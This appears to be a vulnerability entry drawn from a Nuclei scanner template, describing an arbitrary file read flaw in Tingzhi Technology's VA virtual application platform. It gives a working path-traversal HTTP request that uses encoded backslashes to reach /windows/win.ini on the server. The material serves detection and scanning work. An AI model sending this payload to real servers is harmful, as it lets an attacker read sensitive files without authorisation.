# Vulnerability: EAA Application Access System - Arbitary File Read
**Classification:** EAA
**Source:** Nuclei Template (`eaa-app-lfi.yaml`)

## Description
There is an arbitrary file reading vulnerability in the VA virtual application platform of Tingzhi Technology, through which an attacker can obtain sensitive information in the server.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini
```

